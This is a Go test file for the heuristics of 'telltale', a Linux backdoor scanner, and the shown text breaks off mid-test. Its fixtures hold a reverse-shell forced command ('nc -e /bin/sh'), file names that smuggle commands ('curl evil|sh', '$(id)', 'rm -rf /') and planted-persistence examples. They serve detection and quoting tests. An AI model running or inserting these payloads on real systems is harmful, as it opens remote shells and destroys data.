package heuristics

import (
	"fmt"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/donaldsteele/telltale/internal/model"
)

const serverBlob = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIserverserverserverserverserverserverserver"

func cleanCollection() *model.Collection {
	return &model.Collection{
		Accounts: model.Accounts{Users: []model.User{
			{Name: "root", UID: 0, Shell: "/bin/bash", Password: model.PasswordState{Set: true}},
			{Name: "daemon", UID: 1, Shell: "/usr/sbin/nologin", Password: model.PasswordState{Locked: true}},
			{Name: "alice", UID: 1000, Shell: "/bin/bash", Password: model.PasswordState{Set: true}},
			{Name: "+", UID: 0, Shell: ""},
			{Name: "-@x", UID: 0, Shell: "/bin/sh"},
		}},
		Files: []model.FileEntry{
			{Path: "/usr/bin/sudo", Type: "file", Mode: 0o104755},
			{Path: "/etc/passwd", Type: "file", Mode: 0o100644},
		},
		Persist: []model.PersistFile{
			{Path: "/etc/ld.so.preload", Kind: model.PersistKindLDPreload, Lines: nil},
			{Path: "/root/.ssh/authorized_keys", Kind: model.PersistKindAuthorizedKeys,
				Lines: []string{"# c", "from=\"10.0.0.1\" " + serverBlob + " telltale"}},
			{Path: "/etc/systemd/system/foo.service", Kind: model.PersistKindSystemdUnit, Mode: 0o120777, Lines: []string{"/usr/lib/systemd/system/foo.service"}},
			{Path: "/etc/systemd/system/other.service", Kind: model.PersistKindSystemdUnit, Mode: 0o120777, Lines: []string{"/dev/null"}},
		},
		Runtime: model.Runtime{
			Processes: []model.Process{
				{PID: 1, UID: 0, Exe: "/usr/lib/systemd/systemd", Cmdline: "init"},
				{PID: 5, UID: -1},
			},
			Sockets: []model.Socket{{Proto: "tcp", Local: "0.0.0.0:22", Listening: true, PID: 1}},
			Modules: []model.KernelModule{{Name: "ext4", File: "/lib/modules/x/ext4.ko"}},
		},
		CrossView: []model.CrossViewResult{
			{Tool: "ps", Ran: true},
			{Tool: "lsmod", Ran: false, HiddenFromTool: []string{"x"}},
		},
	}
}

func cleanOwned() map[string]string {
	return map[string]string{
		"/usr/bin/sudo":            "sudo",
		"/usr/lib/systemd/systemd": "systemd",
		"/lib/modules/x/ext4.ko":   "linux",
	}
}

var ctx = model.ScanContext{ServerKeyLine: serverBlob + " telltale"}

func find(fs []model.Finding, key string) *model.Finding {
	for i := range fs {
		if fs[i].Key == key {
			return &fs[i]
		}
	}
	return nil
}

func keys(fs []model.Finding) []string {
	var k []string
	for _, f := range fs {
		k = append(k, f.Key)
	}
	return k
}

func want(t *testing.T, c *model.Collection, key string, sev model.Severity) model.Finding {
	t.Helper()
	fs := Run(inventoried(c), ctx, cleanOwned())
	for _, f := range fs {
		checkRule(t, f)
	}
	f := find(fs, key)
	if f == nil {
		t.Fatalf("no finding %s; got %v", key, keys(fs))
	}
	if f.Severity != sev {
		t.Errorf("%s severity %v, want %v", key, f.Severity, sev)
	}
	if f.Source != "heuristic" || !strings.HasPrefix(f.ID, "TT-HEUR-") || f.Title == "" || f.Why == "" || f.Fix == "" || len(f.Refs) == 0 {
		t.Errorf("%s incomplete: %+v", key, f)
	}
	return *f
}

func TestHeuristicsCleanCollectionHasNoFindings(t *testing.T) {
	if fs := Run(inventoried(cleanCollection()), ctx, cleanOwned()); len(fs) != 0 {
		t.Fatalf("findings on clean collection: %v", keys(fs))
	}
}

func TestHeuristicSecondUID0(t *testing.T) {
	c := cleanCollection()
	c.Accounts.Users = append(c.Accounts.Users, model.User{Name: "toor", UID: 0, Shell: "/bin/sh", Password: model.PasswordState{Set: true}})
	want(t, c, "heur.uid0:toor", model.SevBackdoor)
}

func TestHeuristicEmptyPassword(t *testing.T) {
	c := cleanCollection()
	c.Accounts.Users = append(c.Accounts.Users, model.User{Name: "bob", UID: 1001, Shell: "/bin/bash", Password: model.PasswordState{Known: true}})
	want(t, c, "heur.empty_password:bob", model.SevWeak)
}

func TestHeuristicSystemShell(t *testing.T) {
	c := cleanCollection()
	c.Accounts.Users = append(c.Accounts.Users, model.User{Name: "www-data", UID: 33, Shell: "/bin/bash", Password: model.PasswordState{Locked: true}})
	want(t, c, "heur.system_shell:www-data", model.SevNote)
}

func TestHeuristicLDPreload(t *testing.T) {
	c := cleanCollection()
	c.Persist[0].Lines = []string{"/tmp/evil.so"}
	f := want(t, c, "heur.ld_preload", model.SevBackdoor)
	if !strings.Contains(f.Fix, "cp -a --parents '/etc/ld.so.preload' /root/telltale-evidence/") || strings.Index(f.Fix, "cp -a") > strings.Index(f.Fix, "rm ") {
		t.Errorf("fix: %s", f.Fix)
	}
}

func TestHeuristicDeletedExe(t *testing.T) {
	c := cleanCollection()
	c.Runtime.Processes = append(c.Runtime.Processes, model.Process{PID: 77, UID: 0, Exe: "/usr/bin/x", Cmdline: "x -a", ExeDeleted: true})
	f := want(t, c, "heur.proc_exe:deleted:/usr/bin/x", model.SevBackdoor)
	if !strings.Contains(f.Fix, "kill -STOP 77") || !strings.Contains(f.Fix, "cp /proc/77/exe /root/telltale-evidence/77.exe") {
		t.Errorf("fix: %s", f.Fix)
	}
	if !strings.Contains(f.Evidence[0].Detail+f.Evidence[0].After, "x -a") {
		t.Errorf("evidence lacks cmdline: %+v", f.Evidence)
	}
}

func TestHeuristicProcExePaths(t *testing.T) {
	for exe, class := range map[string]string{"/tmp/a": "tmp", "/dev/shm/a": "tmp", "/var/tmp/a": "tmp", "/home/u/.cache/a": "hidden", "/usr/bin/.hidden": "hidden"} {
		c := cleanCollection()
		c.Runtime.Processes = append(c.Runtime.Processes, model.Process{PID: 9, UID: 1000, Exe: exe})
		want(t, c, "heur.proc_exe:"+class+":"+exe, model.SevBackdoor)
	}
}

func TestHeuristicForcedCommandIgnoresServerKey(t *testing.T) {
	c := cleanCollection()
	c.Persist[1].Lines = []string{"command=\"/usr/bin/true\",from=\"10.0.0.1\" " + serverBlob + " telltale"}
	if fs := Run(inventoried(c), ctx, cleanOwned()); len(fs) != 0 {
		t.Fatalf("server key flagged: %v", keys(fs))
	}
	c.Persist[1].Lines = append(c.Persist[1].Lines,
		"command=\"nc -e /bin/sh 1.2.3.4 9\" ssh-rsa AAAAB3other me@x")
	f := want(t, c, "heur.forced_command:/root/.ssh/authorized_keys:2", model.SevBackdoor)
	if !strings.Contains(f.Fix, "telltale-evidence") {
		t.Errorf("fix: %s", f.Fix)
	}
	// forced command also a root key: only the forced-command finding
	if find(Run(inventoried(c), ctx, cleanOwned()), "heur.root_key:/root/.ssh/authorized_keys:2") != nil {
		t.Error("double-reported")
	}
}

func TestHeuristicRootKey(t *testing.T) {
	c := cleanCollection()
	c.Persist[1].Lines = append(c.Persist[1].Lines, "ssh-rsa AAAAB3other me@x")
	want(t, c, "heur.root_key:/root/.ssh/authorized_keys:3", model.SevNote)
	// a non-root user's key is not a root key
	c = cleanCollection()
	c.Persist = append(c.Persist, model.PersistFile{Path: "/home/alice/.ssh/authorized_keys", Kind: model.PersistKindAuthorizedKeys, Lines: []string{"ssh-rsa AAAAB3other me@x"}})
	if fs := Run(inventoried(c), ctx, cleanOwned()); len(fs) != 0 {
		t.Fatalf("got %v", keys(fs))
	}
}

func TestHeuristicUnownedSetuid(t *testing.T) {
	c := cleanCollection()
	c.Files = append(c.Files,
		model.FileEntry{Path: "/usr/bin/evil", Type: "file", Mode: 0o104755},
		model.FileEntry{Path: "/usr/local/bin/mine", Type: "file", Mode: 0o102755},
		model.FileEntry{Path: "/usr/bin/plain", Type: "file", Mode: 0o100755})
	want(t, c, "heur.unowned_setuid:/usr/bin/evil", model.SevBackdoor)
	want(t, c, "heur.unowned_setuid:/usr/local/bin/mine", model.SevNote)
	if find(Run(inventoried(c), ctx, cleanOwned()), "heur.unowned_setuid:/usr/bin/plain") != nil {
		t.Error("plain file flagged")
	}
}

func TestHeuristicImmutableFlag(t *testing.T) {
	c := cleanCollection()
	c.Files = append(c.Files,
		model.FileEntry{Path: "/etc/cron.d/x", Type: "file", Flags: 0x10},
		model.FileEntry{Path: "/etc/y", Type: "file", Flags: 0x20},
		model.FileEntry{Path: "/etc/z", Type: "file", Flags: 0x80},
		// On ext4: extents beside the immutable bit, and the filesystem's
		// own bookkeeping alone (extents, huge file, inline data, index).
		model.FileEntry{Path: "/etc/e", Type: "file", Flags: 0x80010},
		model.FileEntry{Path: "/etc/w", Type: "file", Flags: 0x80000},
		model.FileEntry{Path: "/etc/h", Type: "file", Flags: 0xc0000},
		model.FileEntry{Path: "/etc/n", Type: "file", Flags: 0x10000000},
		model.FileEntry{Path: "/etc/d", Type: "dir", Flags: 0x81000})
	f := want(t, c, "heur.immutable:/etc/cron.d/x", model.SevBackdoor)
	if !strings.Contains(f.Fix, "chattr -i '/etc/cron.d/x'") {
		t.Errorf("fix: %s", f.Fix)
	}
	want(t, c, "heur.immutable:/etc/y", model.SevBackdoor)
	want(t, c, "heur.immutable:/etc/e", model.SevBackdoor)
	for _, p := range []string{"/etc/z", "/etc/w", "/etc/h", "/etc/n", "/etc/d"} {
		if find(Run(inventoried(c), ctx, cleanOwned()), "heur.immutable:"+p) != nil {
			t.Errorf("%s: other flag flagged", p)
		}
	}
}

func TestHeuristicUnownedModule(t *testing.T) {
	c := cleanCollection()
	c.Runtime.Modules = append(c.Runtime.Modules,
		model.KernelModule{Name: "rk"},
		model.KernelModule{Name: "dkms", File: "/lib/modules/x/extra/dkms.ko"})
	want(t, c, "heur.module:rk", model.SevBackdoor)
	want(t, c, "heur.module:dkms", model.SevBackdoor)
}

func TestHeuristicUnownedListener(t *testing.T) {
	c := cleanCollection()
	c.Runtime.Processes = append(c.Runtime.Processes, model.Process{PID: 50, UID: 1000, Exe: "/opt/app/bin/app"})
	c.Runtime.Sockets = append(c.Runtime.Sockets,
		model.Socket{Proto: "tcp", Local: "0.0.0.0:8080", Listening: true, PID: 50},
		model.Socket{Proto: "tcp", Local: "1.2.3.4:5555", Listening: false, PID: 50})
	want(t, c, "heur.unowned_listener:/opt/app/bin/app", model.SevNote)
	if lf := find(Run(inventoried(c), ctx, cleanOwned()), "heur.unowned_listener:/opt/app/bin/app"); lf == nil || strings.Contains(lf.Title, "5555") {
		t.Error("non-listening flagged")
	}
}

func TestHeuristicCrossViewHidden(t *testing.T) {
	c := cleanCollection()
	c.CrossView = append(c.CrossView, model.CrossViewResult{Tool: "ss -t -4", Ran: true, HiddenFromTool: []string{"0.0.0.0:31337", "x"}})
	f := want(t, c, "heur.crossview:ss -t -4", model.SevTampering)
	if len(f.Evidence) != 2 {
		t.Errorf("evidence %v", f.Evidence)
	}
	if f.Title != "`ss -t -4` hides 2 items that telltale can see directly" {
		t.Errorf("title %q", f.Title)
	}
	one := cleanCollection()
	one.CrossView = append(one.CrossView, model.CrossViewResult{Tool: "ps", Ran: true, HiddenFromTool: []string{"pid 94 (lab-hidden)"}})
	if f := want(t, one, "heur.crossview:ps", model.SevTampering); f.Title != "`ps` hides 1 item that telltale can see directly" {
		t.Errorf("title %q", f.Title)
	}
	if find(Run(inventoried(c), ctx, cleanOwned()), "heur.crossview:lsmod") != nil {
		t.Error("not-run tool flagged")
	}
}

func TestHeuristicPersistLink(t *testing.T) {
	c := cleanCollection()
	c.Persist = append(c.Persist,
		model.PersistFile{Path: "/etc/systemd/system/x.service", Kind: model.PersistKindSystemdUnit, Mode: 0o120777, Lines: []string{"/var/tmp/x.service"}},
		model.PersistFile{Path: "/etc/systemd/system/rel.service", Kind: model.PersistKindSystemdUnit, Mode: 0o120777, Lines: []string{"../../../tmp/r.service"}},
		model.PersistFile{Path: "/etc/systemd/system/auditd.service", Kind: model.PersistKindSystemdUnit, Mode: 0o120777, Lines: []string{"/dev/null"}},
		model.PersistFile{Path: "/etc/systemd/system/ok.service", Kind: model.PersistKindSystemdUnit, Mode: 0o120777, Lines: []string{"../../../usr/lib/systemd/system/ok.service"}})
	want(t, c, "heur.persist_link:/etc/systemd/system/x.service", model.SevBackdoor)
	want(t, c, "heur.persist_link:/etc/systemd/system/rel.service", model.SevBackdoor)
	want(t, c, "heur.persist_link:/etc/systemd/system/auditd.service", model.SevWeak)
	fs := Run(inventoried(c), ctx, cleanOwned())
	if find(fs, "heur.persist_link:/etc/systemd/system/ok.service") != nil || find(fs, "heur.persist_link:/etc/systemd/system/other.service") != nil {
		t.Errorf("benign links flagged: %v", keys(fs))
	}
}

func TestHeuristicEmptyPasswordUnknownNotFlagged(t *testing.T) {
	c := cleanCollection()
	c.Accounts.Users = append(c.Accounts.Users, model.User{Name: "carl", UID: 1002, Shell: "/bin/bash"})
	if fs := Run(inventoried(c), ctx, cleanOwned()); len(fs) != 0 {
		t.Fatalf("unknown state flagged: %v", keys(fs))
	}
}

func TestFixQuotesHostileNames(t *testing.T) {
	for _, name := range []string{"/usr/bin/x;curl evil|sh", "/usr/bin/$(id)", "/usr/bin/`id`", "/usr/bin/it's"} {
		c := cleanCollection()
		c.Files = append(c.Files, model.FileEntry{Path: name, Type: "file", Mode: 0o104755})
		f := want(t, c, "heur.unowned_setuid:"+name, model.SevBackdoor)
		if !strings.Contains(f.Fix, sq(name)) {
			t.Errorf("%q not quoted in %s", name, f.Fix)
		}
		if strings.Contains(name, "'") && !strings.Contains(f.Fix, `'\''`) {
			t.Errorf("quote not escaped: %s", f.Fix)
		}
	}
	c := cleanCollection()
	bad := "/usr/bin/x\nrm -rf /"
	c.Files = append(c.Files, model.FileEntry{Path: bad, Type: "file", Mode: 0o104755})
	f := want(t, c, "heur.unowned_setuid:"+bad, model.SevBackdoor)
	if strings.Contains(f.Fix, "rm -rf") || strings.Contains(f.Fix, "\n") || !strings.Contains(f.Fix, "control characters") {
		t.Errorf("fix = %q", f.Fix)
	}
	c = cleanCollection()
	c.Accounts.Users = append(c.Accounts.Users, model.User{Name: "a;b", UID: 0, Shell: "/bin/sh", Password: model.PasswordState{Set: true}})
	f = want(t, c, "heur.uid0:a;b", model.SevBackdoor)
	if !strings.Contains(f.Fix, "userdel 'a;b'") {
		t.Errorf("fix = %q", f.Fix)
	}
}

func TestHeuristicEscapedQuoteCommand(t *testing.T) {
	c := cleanCollection()
	c.Persist[1].Lines = []string{`from="a\"",command="nc -e /bin/sh" ssh-rsa AAAAB3other x`}
	f := want(t, c, "heur.forced_command:/root/.ssh/authorized_keys:1", model.SevBackdoor)
	if !strings.Contains(f.Fix, "highest line number") || !strings.Contains(f.Fix, "--parents") {
		t.Errorf("fix = %s", f.Fix)
	}
	c.Persist[1].Lines = []string{`from="a,b" ssh-rsa AAAAB3other x`}
	if find(Run(inventoried(c), ctx, cleanOwned()), "heur.forced_command:/root/.ssh/authorized_keys:1") != nil {
		t.Error("normal from= flagged as command")
	}
}

func TestHeuristicCmdlineRedacted(t *testing.T) {
	c := cleanCollection()
	c.Runtime.Processes = append(c.Runtime.Processes, model.Process{PID: 8, UID: 0, Exe: "/tmp/m", Cmdline: "mysql --password=secret -h x"})
	f := want(t, c, "heur.proc_exe:tmp:/tmp/m", model.SevBackdoor)
	if strings.Contains(f.Evidence[0].Detail, "secret") {
		t.Errorf("leaked: %s", f.Evidence[0].Detail)
	}
}

func TestHeuristicHiddenDirInOwnHome(t *testing.T) {
	c := cleanCollection()
	c.Runtime.Processes = append(c.Runtime.Processes,
		model.Process{PID: 20, UID: 1000, Exe: "/home/alice/.cache/x/bin"},
		model.Process{PID: 21, UID: 1000, Exe: "/home/bob/.cache/x/bin"},
		model.Process{PID: 22, UID: 0, Exe: "/home/alice/.cache/x/bin"},
		model.Process{PID: 23, UID: 1000, Exe: "/tmp/x"})
	c.Accounts.Users[2].Home = "/home/alice"
	want(t, c, "heur.proc_exe:hidden_home:/home/alice/.cache/x/bin", model.SevNote)
	want(t, c, "heur.proc_exe:hidden:/home/bob/.cache/x/bin", model.SevBackdoor)
	want(t, c, "heur.proc_exe:hidden:/home/alice/.cache/x/bin", model.SevBackdoor)
	want(t, c, "heur.proc_exe:tmp:/tmp/x", model.SevBackdoor)
}

func TestPersistLinkFixRemovesDanglingLink(t *testing.T) {
	dir := t.TempDir()
	link := filepath.Join(dir, "x.service")
	if err := os.Symlink("/nonexistent/evil.service", link); err != nil {
		t.Fatal(err)
	}
	c := cleanCollection()
	c.Persist = append(c.Persist, model.PersistFile{Path: link, Kind: model.PersistKindSystemdUnit, Mode: 0o120777, Lines: []string{"/nonexistent/evil.service"}})
	f := want(t, c, "heur.persist_link:"+link, model.SevBackdoor)
	ev := filepath.Join(dir, "evidence")
	script := strings.ReplaceAll(f.Fix, "/root/telltale-evidence", ev)
	if out, err := exec.Command("sh", "-c", script).CombinedOutput(); err != nil {
		t.Fatalf("fix failed: %v\n%s", err, out)
	}
	if _, err := os.Lstat(link); err == nil {
		t.Error("link not removed")
	}
	if _, err := os.Lstat(filepath.Join(ev, link)); err != nil {
		t.Errorf("link not saved: %v", err)
	}
}

func TestLocalDiversion(t *testing.T) {
	c := &model.Collection{Packages: model.Packages{Installed: []model.Package{{Name: "dash", Status: "install ok installed"}}, Diversions: []model.Diversion{
		{Path: "/usr/bin/sudo", DivertTo: "/usr/bin/sudo.real", Package: ":"},
		{Path: "/bin/sh", DivertTo: "/bin/sh.distrib", Package: "dash"},
		{Path: "/opt/app/bin/x", DivertTo: "/opt/app/bin/x.orig", Package: ":"},
		{Path: "/usr/bin/it's", DivertTo: "/usr/bin/it's.real", Package: ":"},
	}}}
	got := map[string]model.Finding{}
	for _, f := range Run(c, model.ScanContext{}, nil) {
		if strings.HasPrefix(f.Key, "heur.local_diversion:") {
			got[f.Key] = f
		}
	}
	if len(got) != 2 {
		t.Fatalf("findings %v, want the two local diversions of system files", got)
	}
	f := got["heur.local_diversion:/usr/bin/sudo"]
	if f.Severity != model.SevBackdoor || f.ID != "TT-HEUR-014" || !strings.Contains(f.Evidence[0].Detail, "/usr/bin/sudo.real") {
		t.Errorf("finding %+v", f)
	}
	want := "mkdir -p /root/telltale-evidence && cp -a --parents '/usr/bin/sudo' /root/telltale-evidence/"
	if !strings.HasPrefix(f.Fix, want) || !strings.Contains(f.Fix, "dpkg-divert --local --rename --remove '/usr/bin/sudo'") {
		t.Errorf("fix %q", f.Fix)
	}
	if q := got["heur.local_diversion:/usr/bin/it's"].Fix; !strings.Contains(q, `'/usr/bin/it'\''s'`) {
		t.Errorf("fix not quoted: %q", q)
	}
}

func TestLocalDiversionStockUbuntu(t *testing.T) {
	stock := model.SevNote
	for _, osid := range []string{"ubuntu", "debian"} {
		c := &model.Collection{Host: model.Host{OSID: osid}, Packages: model.Packages{Diversions: []model.Diversion{
			// Exactly as ubuntu:22.04 and ubuntu:24.04 images record them.
			{Path: "/usr/bin/man", DivertTo: "/usr/bin/man.REAL", Package: ":"},
			{Path: "/sbin/initctl", DivertTo: "/sbin/initctl.distrib", Package: ":"},
			// The same paths diverted anywhere else are not the stock ones.
			{Path: "/usr/bin/man", DivertTo: "/usr/bin/man.orig", Package: ":"},
		}}}
		sev := map[string][]model.Severity{}
		for _, f := range Run(c, model.ScanContext{}, nil) {
			if f.ID == "TT-HEUR-014" {
				sev[f.Evidence[0].Detail] = append(sev[f.Evidence[0].Detail], f.Severity)
			}
		}
		for detail, want := range map[string]model.Severity{
			"local diversion to /usr/bin/man.REAL":     stock,
			"local diversion to /sbin/initctl.distrib": stock,
			"local diversion to /usr/bin/man.orig":     model.SevBackdoor,
		} {
			if got := sev[detail]; len(got) != 1 || got[0] != want {
				t.Errorf("%s: %s: severities %v, want %v", osid, detail, got, want)
			}
		}
		stock = model.SevBackdoor // the stock pairs are notes only on Ubuntu
	}
}

func TestDiversionByMissingPackage(t *testing.T) {
	c := &model.Collection{Packages: model.Packages{
		Installed: []model.Package{{Name: "dash", Status: "install ok installed"}},
		Diversions: []model.Diversion{
			{Path: "/usr/bin/sudo", DivertTo: "/usr/bin/sudo.distrib", Package: "ghost"},
			{Path: "/bin/sh", DivertTo: "/bin/sh.distrib", Package: "dash"},
		}}}
	var got []model.Finding
	for _, f := range Run(c, model.ScanContext{}, nil) {
		if f.ID == "TT-HEUR-014" {
			got = append(got, f)
		}
	}
	if len(got) != 1 || got[0].Key != "heur.local_diversion:/usr/bin/sudo" || got[0].Severity != model.SevBackdoor || !strings.Contains(got[0].Title, "ghost") {
		t.Fatalf("findings %+v", got)
	}
	if !strings.Contains(got[0].Fix, "dpkg-divert --package 'ghost' --rename --remove '/usr/bin/sudo'") {
		t.Errorf("fix %q", got[0].Fix)
	}
}

// A symlinked authorized_keys: Lines[0] is the link's target and line
// numbers count the target's content; fixes edit the target, never the
// link (sed -i would replace the link with a plain file).
func TestHeuristicSymlinkedAuthorizedKeys(t *testing.T) {
	c := &model.Collection{
		Accounts: model.Accounts{Users: []model.User{{Name: "root", UID: 0, Home: "/root", Shell: "/bin/bash"}}},
		Persist: []model.PersistFile{{Path: "/root/.ssh/authorized_keys", Kind: model.PersistKindAuthorizedKeys, Mode: 0o120777,
			Lines: []string{"../../etc/ssh/keys/root", "ssh-ed25519 AAAAOWNER owner", `command="/bin/sh" ssh-ed25519 AAAAEVIL evil`}}},
	}
	fs := Run(c, model.ScanContext{}, nil)
	byKey := map[string]model.Finding{}
	for _, f := range fs {
		byKey[f.Key] = f
	}
	rk, ok := byKey["heur.root_key:/root/.ssh/authorized_keys:1"]
	if !ok || rk.Evidence[0].Line != 1 {
		t.Fatalf("root key note: %+v (all %v)", rk, fs)
	}
	fc, ok := byKey["heur.forced_command:/root/.ssh/authorized_keys:2"]
	if !ok {
		t.Fatalf("forced command finding missing: %v", fs)
	}
	want := "mkdir -p /root/telltale-evidence && cp -a --parents '/root/.ssh/authorized_keys' '/etc/ssh/keys/root' /root/telltale-evidence/ && sed -i '2d' '/etc/ssh/keys/root'"
	if !strings.HasPrefix(fc.Fix, want) {
		t.Errorf("fix %q, want prefix %q", fc.Fix, want)
	}
	if _, bad := byKey["heur.root_key:/root/.ssh/authorized_keys:3"]; bad {
		t.Errorf("line numbers still count the link target")
	}
}

func runOwned(c *model.Collection, owned map[string]string) []model.Finding {
	return Run(inventoried(c), ctx, owned)
}

func link(path, target string) model.PersistFile {
	return model.PersistFile{Path: path, Kind: model.PersistKindSystemdEnabled, Mode: 0o120777, Lines: []string{target}}
}

func TestPersistLinkPackageOwnedTargetIsNote(t *testing.T) {
	const l, tgt = "/etc/cron.daily/google-chrome", "/opt/google/chrome/cron/google-chrome"
	c := cleanCollection()
	c.Persist = append(c.Persist, link(l, tgt))
	c.Files = append(c.Files, model.FileEntry{Path: tgt, Type: "file", Mode: 0o100755})
	owned := cleanOwned()
	owned[tgt] = "google-chrome-stable"
	fs := runOwned(c, owned)
	f := find(fs, "heur.persist_link_pkg:"+l)
	if f == nil {
		t.Fatalf("no note; got %v", keys(fs))
	}
	if f.Severity != model.SevNote || f.ID != idPersistLink || f.Fix == "" || f.Why == "" {
		t.Errorf("finding: %+v", f)
	}
	if want := l + " runs " + tgt + " from package google-chrome-stable, outside the system directories"; f.Title != want {
		t.Errorf("title %q", f.Title)
	}
	if find(fs, "heur.persist_link:"+l) != nil {
		t.Error("also flagged as a backdoor sign")
	}
	// Counter-tests: the target is a symlink or missing: backdoor sign.
	for name, files := range map[string][]model.FileEntry{
		"symlink": {{Path: tgt, Type: "symlink", Target: "/tmp/evil"}},
		"missing": nil,
		"error":   {{Path: tgt, Type: "file", Err: "read: denied"}},
	} {
		c2 := cleanCollection()
		c2.Persist = append(c2.Persist, link(l, tgt))
		c2.Files = append(c2.Files, files...)
		f := find(runOwned(c2, owned), "heur.persist_link:"+l)
		if f == nil || f.Severity != model.SevBackdoor || find(runOwned(c2, owned), "heur.persist_link_pkg:"+l) != nil {
			t.Errorf("%s target: want a backdoor sign, got %+v", name, f)
		}
	}
	// Counter-test: a target no package owns stays a backdoor sign.
	delete(owned, tgt)
	f = find(runOwned(c, owned), "heur.persist_link:"+l)
	if f == nil || f.Severity != model.SevBackdoor {
		t.Errorf("unowned /opt target: %+v", f)
	}
}

func staleCollection(started, ctime time.Time, exe string, withFile bool) *model.Collection {
	c := cleanCollection()
	c.Runtime.Processes = append(c.Runtime.Processes, model.Process{PID: 4242, UID: 1000, Exe: exe, Comm: "node", Cmdline: "node server.js", ExeDeleted: true, Started: started})
	if withFile {
		c.Files = append(c.Files, model.FileEntry{Path: exe, Type: "file", Mode: 0o100755, CTime: ctime})
	}
	return c
}

func TestStaleExeAfterUpgradeIsNote(t *testing.T) {
	start := time.Date(2026, 11, 1, 10, 0, 0, 0, time.UTC)
	owned := cleanOwned()
	owned["/usr/bin/node"] = "nodejs"
	c := staleCollection(start, start.Add(48*time.Hour), "/usr/bin/node", true)
	fs := runOwned(c, owned)
	f := find(fs, "heur.stale_exe:/usr/bin/node")
	if f == nil {
		t.Fatalf("no note; got %v", keys(fs))
	}
	if f.Severity != model.SevNote || f.ID != idProcExe {
		t.Errorf("finding: %+v", f)
	}
	if want := "Process 4242 (node) still runs the old /usr/bin/node from before it was updated"; f.Title != want {
		t.Errorf("title %q", f.Title)
	}
	if f.Why != "a package upgrade replaced the program while it was running; restart the service to run the new version" {
		t.Errorf("why %q", f.Why)
	}
	if !strings.Contains(f.Fix, "cp /proc/4242/exe") || !strings.Contains(f.Fix, "restart") {
		t.Errorf("fix %q", f.Fix)
	}
	if find(fs, "heur.proc_exe:/usr/bin/node") != nil {
		t.Error("also flagged as a backdoor sign")
	}

	for name, tc := range map[string]struct {
		c     *model.Collection
		owned map[string]string
		exe   string
	}{
		"ctime before start": {staleCollection(start, start.Add(-time.Hour), "/usr/bin/node", true), owned, "/usr/bin/node"},
		"unowned file":       {staleCollection(start, start.Add(time.Hour), "/usr/local/bin/node", true), owned, "/usr/local/bin/node"},
		"file missing":       {staleCollection(start, start, "/usr/bin/node", false), owned, "/usr/bin/node"},
		"deleted in tmp":     {staleCollection(start, start.Add(time.Hour), "/tmp/node", true), map[string]string{"/tmp/node": "nodejs"}, "/tmp/node"},
		"no start time":      {staleCollection(time.Time{}, start, "/usr/bin/node", true), owned, "/usr/bin/node"},
	} {
		fs := runOwned(tc.c, tc.owned)
		f := find(fs, "heur.proc_exe:deleted:"+tc.exe)
		if f == nil || f.Severity != model.SevBackdoor {
			t.Errorf("%s: want a backdoor sign, got %v", name, keys(fs))
		}
		if find(fs, "heur.stale_exe:"+tc.exe) != nil {
			t.Errorf("%s: stale note emitted", name)
		}
	}
}

func userUnitCollection(linkPath, target string) *model.Collection {
	c := cleanCollection()
	c.Accounts.Users[2].Home = "/home/alice"
	unit := model.PersistFile{Path: "/home/alice/.config/systemd/user/x.service", Kind: model.PersistKindSystemdUnit, Mode: 0o100644,
		Lines: []string{"[Service]", "ExecStart=/usr/bin/x --serve", "Restart=always"}}
	c.Persist = append(c.Persist, link(linkPath, target), unit)
	if target != unit.Path {
		unit.Path = target
		c.Persist = append(c.Persist, unit)
	}
	return c
}

func TestUserUnitEnableLayoutIsNote(t *testing.T) {
	const l = "/home/alice/.config/systemd/user/default.target.wants/x.service"
	c := userUnitCollection(l, "/home/alice/.config/systemd/user/x.service")
	fs := runOwned(c, cleanOwned())
	f := find(fs, "heur.user_unit:"+l)
	if f == nil {
		t.Fatalf("no note; got %v", keys(fs))
	}
	if f.Severity != model.SevNote || f.Title != "User alice starts x.service at login" {
		t.Errorf("finding: %+v", f)
	}
	var ev strings.Builder
	for _, e := range f.Evidence {
		ev.WriteString(e.Detail + "|" + e.After + "\n")
	}
	if !strings.Contains(ev.String(), "ExecStart=/usr/bin/x --serve") {
		t.Errorf("evidence lacks ExecStart: %s", ev.String())
	}
	if find(fs, "heur.persist_link:"+l) != nil {
		t.Error("also flagged as a backdoor sign")
	}
	for _, tgt := range []string{"/etc/systemd/user/x.service", "/usr/lib/systemd/user/x.service", "/home/alice/.local/share/systemd/user/x.service"} {
		fs := runOwned(userUnitCollection(l, tgt), cleanOwned())
		if find(fs, "heur.user_unit:"+l) == nil || find(fs, "heur.persist_link:"+l) != nil {
			t.Errorf("target %s: %v", tgt, keys(fs))
		}
	}

	// Counter-tests: still backdoor signs.
	for name, tgt := range map[string]string{
		"other user's home": "/home/bob/.config/systemd/user/x.service",
		"hidden cache dir":  "/home/alice/.cache/x.service",
		"tmp":               "/tmp/x.service",
	} {
		fs := runOwned(userUnitCollection(l, tgt), cleanOwned())
		f := find(fs, "heur.persist_link:"+l)
		if f == nil || f.Severity != model.SevBackdoor || find(fs, "heur.user_unit:"+l) != nil {
			t.Errorf("%s: %v", name, keys(fs))
		}
	}
}

func TestProcFindingsGroupedByProgram(t *testing.T) {
	c := cleanCollection()
	owned := cleanOwned()
	for _, pid := range []int{30, 31, 32} {
		c.Runtime.Processes = append(c.Runtime.Processes, model.Process{PID: pid, UID: 1000, Exe: "/opt/app/bin/app", Comm: "app"})
		c.Runtime.Sockets = append(c.Runtime.Sockets, model.Socket{Proto: "tcp", Local: "0.0.0.0:" + strconv.Itoa(40000+pid), Listening: true, PID: pid})
	}
	for _, pid := range []int{40, 41, 42} {
		c.Runtime.Processes = append(c.Runtime.Processes, model.Process{PID: pid, UID: 1000, Exe: "/tmp/m", Comm: "m"})
	}
	fs := runOwned(c, owned)
	n := 0
	for _, f := range fs {
		if strings.HasPrefix(f.Key, "heur.unowned_listener:") || strings.HasPrefix(f.Key, "heur.proc_exe:") {
			n++
		}
	}
	if n != 2 {
		t.Fatalf("want 2 grouped findings, got %d: %v", n, keys(fs))
	}
	l := find(fs, "heur.unowned_listener:/opt/app/bin/app")
	if l == nil {
		t.Fatalf("keys %v", keys(fs))
	}
	for _, port := range []string{"40030", "40031", "40032"} {
		if !strings.Contains(l.Title, port) {
			t.Errorf("title lacks port %s: %s", port, l.Title)
		}
	}
	p := find(fs, "heur.proc_exe:tmp:/tmp/m")
